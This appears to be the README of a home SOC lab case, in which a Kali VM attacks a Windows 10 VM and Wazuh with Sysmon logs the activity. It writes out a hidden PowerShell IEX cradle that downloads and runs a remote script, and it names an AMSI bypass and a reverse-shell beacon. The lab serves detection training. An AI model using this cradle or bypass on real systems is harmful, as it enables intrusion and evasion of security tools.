# SOC Case — Suspicious PowerShell (IEX Download Cradle + AMSI Bypass)

**Week:** 1 — Windows Fundamentals
**Lab:** Attacker (`192.168.100.106`, `BUTCH`) → Windows 10 Home (`192.168.100.108`, agent `winhome01` / `DESKTOP-F0JVTQT`), detected by Wazuh SIEM (`192.168.100.102`) with Sysmon + PowerShell Script Block Logging
**ATT&CK:** T1059.001 (PowerShell), T1105 (Ingress Tool Transfer), T1027 (Obfuscated Files — encoded command), T1562.001 (Impair Defenses — AMSI bypass), T1571 (Non-Standard Port)
**Severity:** **High** — post-execution code execution as SYSTEM, payload downloaded, AMSI bypass attempted
**Status:** ✅ Completed (2026-10-28)

## Case Structure

| File | Contents |
|---|---|
| `01-Scenario.md` | Background, logging setup (Sysmon + 4104) |
| `02-Attack-Simulation.md` | Kali step-by-step (psexec → IEX cradle → encoded → AMSI bypass) |
| `03-Alert.md` | Events detected: Sysmon 1 / PowerShell 4104 / Sysmon 3 |
| `04-Indicators.md` | IOCs: command lines, hashes, IPs, ports, script blocks |
| `05-Investigation.md` | Triage in Wazuh + evidence list |
| `06-Timeline.md` | Real event timeline |
| `07-Analysis.md` | What each detection layer caught, evasion techniques, gaps |
| `08-Conclusion.md` | Findings, severity, lessons |
| `09-Remediation.md` | AMSI/CLM/logging enforcement + custom Wazuh rule |
| `evidence/` | 8 screenshots |
| `kali-commands.txt` | Exact commands run |

## Result Summary (actual, from evidence)

- **Foothold:** `impacket-psexec` (adminlab) → SYSTEM shell on target; payload `payload.ps1` hosted on Kali via `python3 -m http.server 80`.
- **IEX download cradle executed:** `powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.106/payload.ps1')"` → payload ran (`[+] beacon check-in OK`).
- **Encoded command (`-enc`) executed** — same cradle base64-encoded to evade string matching.
- **AMSI bypass attempted** via reflection (`amsiInitFailed`); download in that run failed (server stopped / lab artifact), but the bypass technique was captured in telemetry.
- **Sysmon Event ID 1** captured full command line: 32-bit `powershell.exe` (SysWOW64) as `NT AUTHORITY\SYSTEM`, parent `cmd.exe`, hashes recorded, SwiftOnSecurity rule tagged `T1059.001 PowerShell`.
- **PowerShell 4104 (Script Block Logging)** confirmed working — script block text captured in `Microsoft-Windows-PowerShell/Operational`.
- **Sysmon Event ID 3** captured network egress: `C:\Users\bryll\Downloads\free.exe` → `192.168.100.106:4444` (tagged `T1571 Non-Standard Port`) — reverse-shell beacon.

## Evidence Gallery

<p align="center">
  <img src="./evidence/01-kali-psexec-shell.png" width="80%" alt="Kali psexec shell">
</p>

<p align="center">
  <img src="./evidence/02-kali-iex-download-cradle.png" width="80%" alt="Kali IEX cradle">
</p>

<p align="center">
  <img src="./evidence/03-kali-http-server-get.png" width="80%" alt="Kali HTTP server GET">
</p>

<p align="center">
  <img src="./evidence/04-kali-encoded-command.png" width="80%" alt="Kali encoded command">
</p>

<p align="center">
  <img src="./evidence/05-kali-amsi-bypass.png" width="80%" alt="Kali AMSI bypass attempt">
</p>

<p align="center">
  <img src="./evidence/07-wazuh-sysmon-1-powershell-iex.png" width="80%" alt="Wazuh Sysmon 1 PowerShell IEX">
</p>

<p align="center">
  <img src="./evidence/08-wazuh-powershell-4104-scriptblock.png" width="80%" alt="Wazuh PowerShell 4104 scriptblock">
</p>

<p align="center">
  <img src="./evidence/09-wazuh-sysmon-3-network-egress.png" width="80%" alt="Wazuh Sysmon 3 network egress">
</p>
